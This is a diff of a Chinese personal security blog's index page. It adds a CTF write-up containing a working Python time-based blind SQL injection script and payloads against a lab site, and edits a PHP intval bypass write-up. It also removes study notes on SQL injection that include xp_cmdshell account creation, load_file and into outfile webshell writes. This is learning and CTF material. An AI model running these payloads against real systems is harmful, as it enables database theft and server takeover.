@@ -157,7 +157,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">茫茫人生奔向你</p>
+        <p class="site-subtitle">宁移白首，不坠青云。</p>
       
   </div>
 
@@ -225,6 +225,137 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/18-12-9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1Yy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ozajykkro.bkt.clouddn.com/69c1dcbbly1fjepkwst9zj20xc0xdn0i.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A funny p1g">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/18-12-9/" itemprop="url">翻山而歌</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T19:54:19+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>提醒自己：穷且益坚，不坠青云之志。<br></p>
+<p>啊自己完整写了第一个shell，虽然写加debug花了整整一天，值！<br>
+以下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import httplib</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import requests; #回显模块</span><br><span class="line">payloads = &apos;1234567890qwertyuiopasdfghjklzxcvbnm&apos;</span><br><span class="line">flag1 = &apos;&apos;</span><br><span class="line"></span><br><span class="line">def exp(x,i): </span><br><span class="line">    print x,i</span><br><span class="line">    stime=time.time()</span><br><span class="line">    time1=time.time()</span><br><span class="line">    url = &quot;http://ctf5.shiyanbar.com/web/wonderkun/index.php&quot;</span><br><span class="line">    #xxx =&quot;1.1.1.1&apos; and (select case when (substring((select database())from &quot;+str(x)+&quot; for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1&quot;  </span><br><span class="line">    #xxx =&quot;1.1.1.1&apos; and (select case when (substring((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 1) from &quot;+str(x)+&quot; for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end ) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">    #xxx =&quot;1.1.1.1&apos; and (select case when (substring((select column_name from information_schema.columns where table_name=&apos;flag&apos;) from &quot;+str(x)+&quot;  for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">    xxx =&quot;1.1.1.1&apos; and (select case when (substring((select flag from flag) from &quot;+str(x)+&quot;  for 1)=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1&quot; #select flag from flag 列表同名</span><br><span class="line">    print xxx</span><br><span class="line">    headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;ctf5.shiyanbar.com&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Cookie&quot;:&quot;Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1543912246,1543912258,1543912373,1544170583; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*169264%2CnickName%3Ayyp1gg; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1544408666; PHPSESSID=cd731jiflujaate6j3k87r28i7&quot;,</span><br><span class="line">    &quot;X-FORWARDED-FOR&quot;: xxx</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    ftime=time.time()</span><br><span class="line">    time1 = ftime - stime</span><br><span class="line">    if time1 &gt; 6:</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">print &apos;Start to retrive the Mysql table_schema || table_name || column_name || flag:&apos;</span><br><span class="line">for x in range(1,33):</span><br><span class="line">    print &quot;\n&quot;</span><br><span class="line">    for i in payloads:</span><br><span class="line">        print &apos;*&apos;,</span><br><span class="line">        if (exp(x,i)):</span><br><span class="line">            flag1+=i</span><br><span class="line">            print &quot;\n&quot;+flag1</span><br><span class="line">            break</span><br><span class="line">        else: </span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &apos;\n[Done] reasult is : &apos;+flag1</span><br></pre></td></tr></table></figure>
+<p>写的时候遇到的问题有：1.基本的sql语句遗忘 2.substring() 函数的使用 3.脚本中括号的使用 4. 时延注入的时间间隔等<br>
+shell只是为方便解决繁复流程的工具，思路如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. 看到和ip有关，想到xff头伪造ip。用插件修改后成功返回新的ip，说明可以注入。</span><br><span class="line">2. 首先要得到数据库的名字。</span><br><span class="line">	1.1.1.1&apos; and (select case when (substring((select database())from &quot;+str(x)+&quot; for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1。  </span><br><span class="line">	这里遇到了and和or的优先级问题，or最低，not&gt;and&gt;or。</span><br><span class="line">3. 之后要得到表名。</span><br><span class="line">	1.1.1.1&apos; and (select case when (select count(*) from information_schema.tables where table_schema=&apos;web4&apos;)=2 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1 #获取表数</span><br><span class="line">	1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 0))=9 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1  #第一个表长度为9</span><br><span class="line">	1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 1))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1 #第二个表长度为4，优先猜第二个</span><br><span class="line">	1.1.1.1&apos; and (select case when (substring((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 1) from &quot;+str(x)+&quot; for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end ) and &apos;1&apos;=&apos;1 </span><br><span class="line">4.之后要得到列名。</span><br><span class="line">	一样的步骤，先获取列数再获取列长，最后得到列名。</span><br><span class="line">	1.1.1.1&apos; and (select case when (select count(column_name) from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;)=1 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1 #只有一列</span><br><span class="line">	1.1.1.1&apos; and (select case when length((select column_name from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1 #列长为4</span><br><span class="line">	1.1.1.1&apos; and (select case when (substring((select column_name from information_schema.columns where table_name=&apos;flag&apos;) from &quot;+str(x)+&quot;  for (1))=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1 </span><br><span class="line">5.最后获取字段。</span><br><span class="line">	先获取字段的长度。</span><br><span class="line">	1.1.1.1&apos; and (select case when length((select flag from flag))=32 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1 #字段长32位</span><br><span class="line">	1.1.1.1&apos; and (select case when (substring((select flag from flag) from &quot;+str(x)+&quot;  for 1)=&apos;&quot;+i+&quot;&apos;) then sleep(6) else 0 end) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>通过写这个shell对py掌握也多了一点。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/18-12-9/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -311,8 +442,8 @@
         
           <p>沙雕公司再不发风衣真要冷出问题了。<br></p>
 <p>1.没有什么提示的情况下，抓包看报头里有没有什么线索。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123; //isset函数是检测变量是否设置</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);//header函数向客户端发送原始的 HTTP 报头。</span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;  // die函数输出一条消息，并退出当前脚本。 </span><br><span class="line">foreach([$_POST] as $global_var) &#123;   //遍历提交的数据  前as后</span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123;  //键名赋给key 值赋给value</span><br><span class="line">        $value = trim($value); //移除提交字符串两侧的（2个？）字符</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);//addslashes转义函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function is_palindrome_number($number) &#123;</span><br><span class="line">    $number = strval($number); //将数组及类之外的变量类型转换成字符串类型</span><br><span class="line">    $i = 0;</span><br><span class="line">    $j = strlen($number) - 1;</span><br><span class="line">    while($i &lt; $j) &#123;</span><br><span class="line">        if($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123; //is_numeric判断$_REQUEST[&apos;number&apos;]是否为数字或数字字符串</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  //strrev反转函数。这里是最关键的intval函数</span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>ntval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123; //isset函数是检测变量是否设置</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);//header函数向客户端发送原始的 HTTP 报头。</span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;  // die函数输出一条消息，并退出当前脚本。 </span><br><span class="line">foreach([$_POST] as $global_var) &#123;   //遍历提交的数据  前as后</span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123;  //键名赋给key 值赋给value</span><br><span class="line">        $value = trim($value); //移除提交字符串两侧的字符,默认在命令行里移除空格，换行，制表符等。</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);//addslashes转义函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function is_palindrome_number($number) &#123;</span><br><span class="line">    $number = strval($number); //将数组及类之外的变量类型转换成字符串类型</span><br><span class="line">    $i = 0;</span><br><span class="line">    $j = strlen($number) - 1;</span><br><span class="line">    while($i &lt; $j) &#123;</span><br><span class="line">        if($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123; //is_numeric判断$_REQUEST[&apos;number&apos;]是否为数字或数字字符串</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  //strrev反转函数。这里是最关键的intval函数</span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>
 通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。<br>
 2.SELECT pwd FROM user WHERE uname = ‘1’^1 group by pwd with rollup limit 1 offset 1#  //于是我们可以构造’1’<sup>1=1</sup>1=0=字母开头的字符串，使条件被满足。 然后按pwd列出，最后有一个null值，并跳过1个数据选取1个数据（就是选择null），返回选取结果为null。把我们提交的密码也设置为null，就可以绕过了。<br>
 SELECT pwd FROM user WHERE uname = ‘cc’^0 group by pwd with rollup limit 1 offset 1#</p>
@@ -1509,207 +1640,6 @@ a.test.asp;1.jpg<br>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/03/18-1-3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="1Yy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://ozajykkro.bkt.clouddn.com/69c1dcbbly1fjepkwst9zj20xc0xdn0i.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A funny p1g">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/03/18-1-3/" itemprop="url">a mouth</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T23:24:31+08:00">
-                2018-01-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>13号补笔记…5章的内容…<br><br>
-第五章——sql注入漏洞。<br>
-一.sql注入漏洞的原因是用户输入的数据被SQL解释其执行。以前的笔记：</p>
-<blockquote>
-<p>注入攻击的本质：1.能够用户控制输入。 2.原来执行的代码拼接了用户的输入。<br>
-利用注入漏洞的目的就是绕过程序限制，使用户输入的数据带入数据库，利用数据库获得更大的权限或者更多信息。可以归为查询数据、读写文件、执行命令。<br>
-常见注入漏洞可以分为数字型注入和字符型注入。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.xxser.com/test.php?id=*8* //执行正常成功返回，猜测sql语句为：select * from table where id=8</span><br><span class="line">www.xxser.com/test.php?id=*8&apos; *//会出错</span><br><span class="line">www.xxser.com/test.php?id=*8 and 1=1* //执行正常成功返回</span><br><span class="line">www.xxser.com/test.php?id=*8 and 1=2* // 可以执行但无返回值</span><br></pre></td></tr></table></figure>
-<p>以上是基本的数字型注入。可以修改1=1利用union语句执行联合查询。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username=&apos;*admin*&apos; //例句 </span><br><span class="line">select * from table where username=&apos;*admin and 1=1*&apos; //像数字型一样不行</span><br><span class="line">select * from table where username=&apos;*admin&apos; and 1=1 --*&apos; // 必须闭合单引号和注释掉多余代码</span><br></pre></td></tr></table></figure>
-<p>–代表注释。输入的第一个’可以反向闭合掉username的输入框。<br>
-以上都是布尔值判断注入点存在与否，还有可以通过延时判断（sleep（x））能否注入。<br>
-二.常见数据库的注入（sql sever和 mysql）<br>
-(1).sql server<br>
-sql server是微软开发，用在大型数据库的数据库管理系统。<br>
-1).利用错误回显提取信息。<br>
-1.枚举当前表及列<br>
-<code>select from users where username='root' and password='root' having 1=1--'</code><br>
-报错：user.id无效，没有包含在聚合函数或者gruop by子句中。* 继续构造 ：</p>
-<p><code>select * from users where username='*root*' and password='*root' gruop by user.id having 1=1--*'</code><br>
-报错：user.username无效。循环，直到查询出所有列名。<br>
-2.利用数据类型错误提取数据。<br>
-<code>select * from users where username='*root*' and password='*root' and 1&gt;(select top 1 username from users)*'</code><br>
-报错：varchar值root转换为int失败。找到账户名root。<br>
-<code>select * from users where username='*root*' and password='*root' and 1&gt;(select top 1 username from users where username not in ('root'))*'</code><br>
-找到下一个username。<br>
-2).order by 子句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password,form users where id=1 // sql正常执行</span><br><span class="line">select id,username,password,form users where id=1 order by 1 //按第1列排序</span><br><span class="line">select id,username,password,form users where id=1 order by 2 //按第2列排序</span><br><span class="line">select id,username,password,form users where id=1 order by 3 //按第3列排序</span><br><span class="line">select id,username,password,form users where id=1 order by 4 //抛出异常</span><br></pre></td></tr></table></figure>
-<p>异常：order by位号4超出列表中项数的范围。得知当前sql语句有几列存在，可以配合union关键字进行下一步攻击。<br>
-3).union查询<br>
-union查询基本规则：所有查询的列数必须相同，数据类型必须兼容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password,sex from users where id=1 union select null ;</span><br><span class="line">select id,username,password,sex from users where id=1 union select null,null;</span><br><span class="line">select id,username,password,sex from users where id=1 union select null,null,null;//直到无异常产生</span><br></pre></td></tr></table></figure>
-<p>4).存储过程<br>
-类似系统自带的函数。<br>
-最容易使用的存储过程是xp_cmdshell，这个存储过程允许用户操作系统函数。<br>
-<code>select * from table where id = *1; exec (xp_cmdshell 'net user test test /add')*</code> //动态执行，添加test账户，登录密码test`<br>
-类似的存储过程还有xp_regread(读取注册表),xp_regdeletevalue(删除注册表),xp_dirtree(读取目录)<br>
-5).动态执行<br>
-sql server支持动态执行，用户可以提交一个字符串来执行sql语句。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&apos;select username  from users&apos;)</span><br><span class="line">exec(&apos; selec&apos;+&apos;t  password fr&apos;+&apos;om users &apos;)</span><br></pre></td></tr></table></figure>
-<p>(2).mysql<br>
-mysql是一个创业的小青年，只能运行中小型数据库。<br>
-1).获取元数据<br>
-通过mysql提供的信息数据库information_schema,information_schema获取元数据。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata limit 0,1 //从information_schema.schemata表中查询出第一个数据库名称。</span><br><span class="line">select table_name from information_schema.tables where table_schema=(select database()) limit 0,1 // 查询当前数据库表</span><br><span class="line">select column_name from information_schema.columns where table_name=&apos;students&apos; limit 0,1 // 查询指定表的所有字段</span><br></pre></td></tr></table></figure>
-<p>2).union查询<br>
-明天装了mysql测试了再来补。<br>
-3).函数利用<br>
-1.load_file()<br>
-使用mysql读取磁盘文件是非常容易的。文件必须在磁盘上，并且路径必须为绝对路径,要求用户持有file权限。<br>
-<code>union select 1,load_file('/etc/password'),3,4,5 #</code><br>
-2.into outfile<br>
-向磁盘写入文件的操作。要求类似load_file()。<br>
-<code>select '&lt;?php phpinfo();?&gt;' into outfile 'c:\wwwroot\1.php'</code><br>
-3.链接函数concat_ws()<br>
-<code>select name from student where id=1 union select concat(user(),0x2c,database(),0x2c,version())</code><br>
-4).显错式注入<br>
-使用错误提取数据库信息，类似sql server。<br>
-5).宽字节注入<br>
-宽字节注入是由编码不统一造成的，一般出现在php+mysql中。当php.ini中的magic_quotes_gpc（魔术引号）开启时，get，post，cookie接受的’ &quot; \和null字符都会被加一个\转义。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;h3&gt; input :&quot;. $_get[&apos;id&apos;].&quot;&lt;/h3&gt;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>get接收到的id若是’会被转义为’。但是，当输入“%d5’”时，会被转义为“珹’”。在这个情况下，单引号就没有被转义了。<br>
-6).长字符截断<br>
-当sql_mode选项为dafault时，strict_all_tables选项是关闭的。这时mysql对插入超长的值只会提示warning而不是error。<br>
-这时，定义一个username为varchar(8)。若插入一个username为&quot;admin        x&quot;，出现警告后仍然插入到数据库，长度为8。<br>
-假如管理员登陆用户名是admin，攻击者注册一个admin…x。也可以进入后台管理界面。<br>
-7).延时注入<br>
-延时注入属于盲注技巧的一种。<br>
-<code>select * from users where id=1 and sleep(5); //5秒后执行语句</code><br>
-可以用sleep函数判断url是否存在sql注入漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.org/uesr.jsp?id=1 // 正常返回</span><br><span class="line">www.xxx.org/uesr.jsp?id=1 &apos; //正常返回</span><br><span class="line">www.xxx.org/uesr.jsp?id=1 &apos; and 1=1//正常返回</span><br><span class="line">www.xxx.org/uesr.jsp?id=1 and sleep(3)//正常返回，多3秒后打开页面</span><br></pre></td></tr></table></figure>
-<p>三、防御sql注入<br>
-1.严格设定参数的数据类型。<br>
-2.特俗字符转义。<br>
-3.使用预编译语句。参考以前的笔记。预编译语句在创建的时候就已经将sql语句发送给dbms（数据库管理系统）完成了解析检查编译的工作，使用时只是将变量传给已经预编译好的sql语句。<br>
-4.谨慎使用存储过程。<br>
-5.利用框架技术提供的封装技术。类似预编译。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/03/18-1-3/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1764,7 +1694,7 @@ mysql是一个创业的小青年，只能运行中小型数据库。<br>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">35</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1842,11 +1772,9 @@ mysql是一个创业的小青年，只能运行中小型数据库。<br>
 </div>
 
 
-  <span class="post-meta-divider">| &nbsp;</span>
 
 
-
